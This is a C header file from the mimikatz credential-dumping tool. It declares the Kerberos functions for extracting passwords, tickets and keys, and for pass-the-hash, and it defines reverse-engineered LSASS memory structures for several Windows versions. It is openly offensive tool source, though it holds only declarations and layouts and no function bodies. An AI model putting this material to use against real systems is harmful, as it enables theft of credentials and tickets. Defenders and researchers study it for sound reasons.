/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_sekurlsa.h"
#include "../../kerberos/kuhl_m_kerberos_ticket.h"
#include "../modules/kull_m_crypto_system.h"
#include "../modules/kull_m_file.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package;

NTSTATUS kuhl_m_sekurlsa_kerberos(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_kerberos_tickets(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_kerberos_keys(int argc, wchar_t * argv[]);

typedef void (CALLBACK * PKUHL_M_SEKURLSA_KERBEROS_CRED_CALLBACK) (IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);

typedef struct _KIWI_KERBEROS_ENUM_DATA {
	PKUHL_M_SEKURLSA_KERBEROS_CRED_CALLBACK callback;
	PVOID optionalData;
} KIWI_KERBEROS_ENUM_DATA, *PKIWI_KERBEROS_ENUM_DATA;

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_generic(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);
void kuhl_m_sekurlsa_enum_generic_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKIWI_KERBEROS_ENUM_DATA pEnumData);
void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN DWORD grp, IN PVOID tickets, IN BOOL isFile);

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_passwords(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);
void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);
void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_keys(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);
void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);

wchar_t * kuhl_m_sekurlsa_kerberos_generateFileName(PLUID LogonId, const DWORD grp, const DWORD index, PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext);

PKIWI_KERBEROS_TICKET kuhl_m_sekurlsa_kerberos_createTicket(PBYTE pTicket, PKULL_M_MEMORY_HANDLE hLSASS);
void kuhl_m_sekurlsa_kerberos_createExternalName(PKERB_EXTERNAL_NAME *pExternalName, PKULL_M_MEMORY_HANDLE hLSASS);
void kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(PKIWI_KERBEROS_BUFFER pBuffer, PKULL_M_MEMORY_HANDLE hLSASS);

typedef struct _KERB_INFOS {
	LONG	offsetLuid;
	LONG	offsetCreds;
	LONG	offsetTickets[3];
	LONG	offsetSmartCard;
	SIZE_T	structSize;

	LONG	offsetServiceName;
	LONG	offsetTargetName;
	LONG	offsetDomainName;
	LONG	offsetTargetDomainName;
	LONG	offsetDescription;
	LONG	offsetAltTargetDomainName;
	LONG	offsetClientName;
	LONG	offsetTicketFlags;
	LONG	offsetKeyType;
	LONG	offsetKey;
	LONG	offsetStartTime;
	LONG	offsetEndTime;
	LONG	offsetRenewUntil;
	LONG	offsetTicketEncType;
	LONG	offsetTicket;
	LONG	offsetTicketKvno;
	SIZE_T	structTicketSize;

	LONG	offsetKeyList;
	SIZE_T	structKeyListSize;

	LONG	offsetHashGeneric;
	SIZE_T	structKeyPasswordHashSize;

	LONG	offsetSizeOfCsp;
	LONG	offsetNames;
	SIZE_T	structCspInfosSize;

	LONG	offsetPasswordErase;
	SIZE_T	passwordEraseSize;
} KERB_INFOS, *PKERB_INFOS;

typedef struct _KERB_SMARTCARD_CSP_INFO_5 {
	DWORD dwCspInfoLen;
	PVOID ContextInformation;
	ULONG nCardNameOffset;
	ULONG nReaderNameOffset;
	ULONG nContainerNameOffset;
	ULONG nCSPNameOffset;
	WCHAR bBuffer[ANYSIZE_ARRAY];
} KERB_SMARTCARD_CSP_INFO_5, *PKERB_SMARTCARD_CSP_INFO_5;

typedef struct _KERB_SMARTCARD_CSP_INFO {
	DWORD dwCspInfoLen;
	DWORD MessageType;
	union {
		PVOID   ContextInformation;
		ULONG64 SpaceHolderForWow64;
	};
	DWORD flags;
	DWORD KeySpec;
	ULONG nCardNameOffset;
	ULONG nReaderNameOffset;
	ULONG nContainerNameOffset;
	ULONG nCSPNameOffset;
	WCHAR bBuffer[ANYSIZE_ARRAY];
} KERB_SMARTCARD_CSP_INFO, *PKERB_SMARTCARD_CSP_INFO;

typedef struct _KIWI_KERBEROS_CSP_INFOS_5 {
	LSA_UNICODE_STRING PinCode;
	PVOID unk0;
	PVOID unk1;
	PVOID CertificateInfos;

	PVOID unkData;	// 0 = CspData
	DWORD Flags;	// 1 = CspData (not 0x21)


	DWORD CspDataLength;
	KERB_SMARTCARD_CSP_INFO_5 CspData;
} KIWI_KERBEROS_CSP_INFOS_5, *PKIWI_KERBEROS_CSP_INFOS_5;

typedef struct _KIWI_KERBEROS_CSP_INFOS_60 {
	LSA_UNICODE_STRING PinCode;
	PVOID unk0;
	PVOID unk1;
	PVOID CertificateInfos;

	PVOID unkData;	// 0 = CspData
	DWORD Flags;	// 0 = CspData
	DWORD unkFlags;	// 0x141

	DWORD CspDataLength;
	KERB_SMARTCARD_CSP_INFO CspData;
} KIWI_KERBEROS_CSP_INFOS_60, *PKIWI_KERBEROS_CSP_INFOS_60;

typedef struct _KIWI_KERBEROS_CSP_INFOS_62 {
	LSA_UNICODE_STRING PinCode;
	PVOID unk0;
	PVOID unk1;
	PVOID CertificateInfos;
	PVOID unk2;
	PVOID unkData;	// 0 = CspData
	DWORD Flags;	// 0 = CspData
	DWORD unkFlags;	// 0x141 (not 0x61)

	DWORD CspDataLength;
	KERB_SMARTCARD_CSP_INFO CspData;
} KIWI_KERBEROS_CSP_INFOS_62, *PKIWI_KERBEROS_CSP_INFOS_62;

typedef struct _KIWI_KERBEROS_CSP_INFOS_10 {
	LSA_UNICODE_STRING PinCode;
	PVOID unk0;
	PVOID unk1;
	PVOID CertificateInfos;
	PVOID unk2;
	PVOID unkData;	// 0 = CspData
	DWORD Flags;	// 0 = CspData
	DWORD unkFlags;	// 0x141 (not 0x61)
	PVOID unk3;
	DWORD CspDataLength;
	KERB_SMARTCARD_CSP_INFO CspData;
} KIWI_KERBEROS_CSP_INFOS_10, *PKIWI_KERBEROS_CSP_INFOS_10;

typedef struct _KIWI_KERBEROS_LOGON_SESSION_51 {
	ULONG		UsageCount;
	LIST_ENTRY	unk0;
	LIST_ENTRY	unk1;
	PVOID		unk2;
	ULONG		unk3;	// filetime.1 ?
	ULONG		unk4;	// filetime.2 ?
	PVOID		unk5;
	PVOID		unk6;
	PVOID		unk7;
	LUID		LocallyUniqueIdentifier;
#ifdef _M_IX86
	ULONG		unkAlign;
#endif
	FILETIME	unk8;
	PVOID		unk9;
	ULONG		unk10;	// filetime.1 ?
	ULONG		unk11;	// filetime.2 ?
	PVOID		unk12;
	PVOID		unk13;
	PVOID		unk14;
	KIWI_GENERIC_PRIMARY_CREDENTIAL	credentials;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	ULONG		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		unk22;
	PVOID		pKeyList;
	PVOID		unk24;
	LIST_ENTRY	Tickets_1;
	LIST_ENTRY	Tickets_2;
	LIST_ENTRY	Tickets_3;
	PVOID		SmartcardInfos;
} KIWI_KERBEROS_LOGON_SESSION_51, *PKIWI_KERBEROS_LOGON_SESSION_51;

typedef struct _KIWI_KERBEROS_LOGON_SESSION {
	ULONG		UsageCount;
	LIST_ENTRY	unk0;
	PVOID		unk1;
	ULONG		unk2;	// filetime.1 ?
	ULONG		unk3;	// filetime.2 ?
	PVOID		unk4;
	PVOID		unk5;
	PVOID		unk6;
	LUID		LocallyUniqueIdentifier;
#ifdef _M_IX86
	ULONG		unkAlign;
#endif
	FILETIME	unk7;
	PVOID		unk8;
	ULONG		unk9;	// filetime.1 ?
	ULONG		unk10;	// filetime.2 ?
	PVOID		unk11;
	PVOID		unk12;
	PVOID		unk13;
	KIWI_GENERIC_PRIMARY_CREDENTIAL	credentials;
	ULONG		unk14;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	PVOID		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		pKeyList;
	PVOID		unk23;
	LIST_ENTRY	Tickets_1;
	FILETIME	unk24;
	LIST_ENTRY	Tickets_2;
	FILETIME	unk25;
	LIST_ENTRY	Tickets_3;
	FILETIME	unk26;
	PVOID		SmartcardInfos;
} KIWI_KERBEROS_LOGON_SESSION, *PKIWI_KERBEROS_LOGON_SESSION;

typedef struct _KIWI_KERBEROS_10_PRIMARY_CREDENTIAL
{
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID		unk0;
	LSA_UNICODE_STRING Password;
} KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, *PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL;

typedef struct _KIWI_KERBEROS_LOGON_SESSION_10 {
	ULONG		UsageCount;
	LIST_ENTRY	unk0;
	PVOID		unk1;
	ULONG		unk1b;
	FILETIME	unk2;
	PVOID		unk4;
	PVOID		unk5;
	PVOID		unk6;
	LUID		LocallyUniqueIdentifier;
	FILETIME	unk7;
	PVOID		unk8;
	ULONG		unk8b;
	FILETIME	unk9;
	PVOID		unk11;
	PVOID		unk12;
	PVOID		unk13;
#ifdef _M_IX86
	ULONG		unkAlign;
#endif
	KIWI_KERBEROS_10_PRIMARY_CREDENTIAL	credentials;
	ULONG		unk14;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	//PVOID		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		unk22;
	PVOID		unk23;
	PVOID		unk24;
	PVOID		unk25;
	PVOID		pKeyList;
	PVOID		unk26;
	LIST_ENTRY	Tickets_1;
	FILETIME	unk27;
	LIST_ENTRY	Tickets_2;
	FILETIME	unk28;
	LIST_ENTRY	Tickets_3;
	FILETIME	unk29;
	PVOID		SmartcardInfos;
} KIWI_KERBEROS_LOGON_SESSION_10, *PKIWI_KERBEROS_LOGON_SESSION_10;

typedef struct _KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO
{
	DWORD StructSize;
	struct _LSAISO_DATA_BLOB *isoBlob; // aligned;
} KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO, *PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO;

typedef struct _KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607
{
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID		unkFunction;
	DWORD		type; // or flags 2 = normal, 1 = ISO
	union {
		LSA_UNICODE_STRING Password;
		KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO IsoPassword;
	};
} KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, *PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607;

typedef struct _KIWI_KERBEROS_LOGON_SESSION_10_1607 {
	ULONG		UsageCount;
	LIST_ENTRY	unk0;
	PVOID		unk1;
	ULONG		unk1b;
	FILETIME	unk2;
	PVOID		unk4;
	PVOID		unk5;
	PVOID		unk6;
	LUID		LocallyUniqueIdentifier;
	FILETIME	unk7;
	PVOID		unk8;
	ULONG		unk8b;
	FILETIME	unk9;
	PVOID		unk11;
	PVOID		unk12;
	PVOID		unk13;
#ifdef _M_IX86
	ULONG		unkAlign;
#endif
	KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607	credentials;
	ULONG		unk14;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	PVOID		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		unk22;
	PVOID		unk23;
	PVOID		unk24;
	PVOID		unk25;
	PVOID		pKeyList;
	PVOID		unk26;
	LIST_ENTRY	Tickets_1;
	FILETIME	unk27;
	LIST_ENTRY	Tickets_2;
	FILETIME	unk28;
	LIST_ENTRY	Tickets_3;
	FILETIME	unk29;
	PVOID		SmartcardInfos;
} KIWI_KERBEROS_LOGON_SESSION_10_1607, *PKIWI_KERBEROS_LOGON_SESSION_10_1607;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_51 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	PKERB_EXTERNAL_NAME	ClientName;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	PVOID		unk6;
	PVOID		unk7;
	PVOID		unk8;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk9;
	ULONG		unk10;
	PCWSTR		domain;
	ULONG		unk11;
	PVOID		strangeNames;
	ULONG		unk12;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_51, *PKIWI_KERBEROS_INTERNAL_TICKET_51;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_52 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_52, *PKIWI_KERBEROS_INTERNAL_TICKET_52;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_60 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	//LSA_UNICODE_STRING	KDCServer;	//?
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_60, *PKIWI_KERBEROS_INTERNAL_TICKET_60;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_6 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	LSA_UNICODE_STRING	KDCServer;	//?
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_6, *PKIWI_KERBEROS_INTERNAL_TICKET_6;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_10 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	LSA_UNICODE_STRING	KDCServer;	//?
	LSA_UNICODE_STRING	unk10586_d;	//?
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_10, *PKIWI_KERBEROS_INTERNAL_TICKET_10;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_10_1607 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	LSA_UNICODE_STRING	KDCServer;	//?
	LSA_UNICODE_STRING	unk10586_d;	//?
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	PVOID		unk14393_0;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk14393_1;
	PVOID		unk3; // ULONG		KeyType2;
	PVOID		unk4; // KIWI_KERBEROS_BUFFER	Key2;
	PVOID		unk5; // up
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_10_1607, *PKIWI_KERBEROS_INTERNAL_TICKET_10_1607;

typedef struct _KERB_HASHPASSWORD_GENERIC {
	DWORD Type;
	SIZE_T Size;
	PBYTE Checksump;
} KERB_HASHPASSWORD_GENERIC, *PKERB_HASHPASSWORD_GENERIC;

typedef struct _KERB_HASHPASSWORD_5 {
	LSA_UNICODE_STRING salt;	// http://tools.ietf.org/html/rfc3962
	KERB_HASHPASSWORD_GENERIC generic;
} KERB_HASHPASSWORD_5, *PKERB_HASHPASSWORD_5;

typedef struct _KERB_HASHPASSWORD_6 {
	LSA_UNICODE_STRING salt;	// http://tools.ietf.org/html/rfc3962
	PVOID stringToKey; // AES Iterations (dword ?)
	KERB_HASHPASSWORD_GENERIC generic;
} KERB_HASHPASSWORD_6, *PKERB_HASHPASSWORD_6;

typedef struct _KERB_HASHPASSWORD_6_1607 {
	LSA_UNICODE_STRING salt;	// http://tools.ietf.org/html/rfc3962
	PVOID stringToKey; // AES Iterations (dword ?)
	PVOID unk0;
	KERB_HASHPASSWORD_GENERIC generic;
} KERB_HASHPASSWORD_6_1607, *PKERB_HASHPASSWORD_6_1607;

typedef struct _KIWI_KERBEROS_KEYS_LIST_5 {
	DWORD unk0;		// dword_1233EC8 dd 4
	DWORD cbItem;	// debug048:01233ECC dd 5
	PVOID unk1;
	PVOID unk2;
	//KERB_HASHPASSWORD_5 KeysEntries[ANYSIZE_ARRAY];
} KIWI_KERBEROS_KEYS_LIST_5, *PKIWI_KERBEROS_KEYS_LIST_5;

typedef struct _KIWI_KERBEROS_KEYS_LIST_6 {
	DWORD unk0;		// dword_1233EC8 dd 4
	DWORD cbItem;	// debug048:01233ECC dd 5
	PVOID unk1;
	PVOID unk2;
	PVOID unk3;
	PVOID unk4;
	//KERB_HASHPASSWORD_6 KeysEntries[ANYSIZE_ARRAY];
} KIWI_KERBEROS_KEYS_LIST_6, *PKIWI_KERBEROS_KEYS_LIST_6;

typedef struct _KIWI_KERBEROS_ENUM_DATA_TICKET {
	BOOL isTicketExport;
	BOOL isFullTicket;
} KIWI_KERBEROS_ENUM_DATA_TICKET, *PKIWI_KERBEROS_ENUM_DATA_TICKET;